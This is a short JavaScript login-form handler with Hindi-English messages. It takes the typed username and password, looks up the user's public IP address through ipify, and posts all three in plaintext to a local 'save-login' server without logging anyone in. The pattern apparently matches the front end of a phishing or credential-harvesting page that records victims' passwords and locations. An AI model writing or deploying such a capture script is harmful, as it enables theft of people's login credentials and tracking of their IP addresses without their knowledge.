document.addEventListener('DOMContentLoaded', function() {
    
    const loginForm = document.getElementById('loginForm');

    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault(); 

            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            const btn = document.querySelector('.login-btn');
            const originalText = btn.innerText;
            btn.innerText = "Please wait...";

            let userIP = "Unknown";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIP = ipData.ip;
            } catch (err) {
                console.log("IP fetch failed");
            }

            try {
                const response = await fetch('http://localhost:3000/save-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password, ip: userIP })
                });

                const result = await response.json();

                if (result.success) {
                    alert("✅ SUCCESS: Data Database mein save ho gaya!");
                } else {
                    alert("❌ Error: Data save nahi hua.");
                }
            } catch (error) {
                console.error("Server Error:", error);
                alert("⚠️ Server Error: 'node server.js' run karna bhool gaye kya?");
            }

            // Button reset
            btn.innerText = originalText;
        });
    } else {
        console.error("Galti: HTML mein 'id=loginForm' nahi mila!");
    }
});
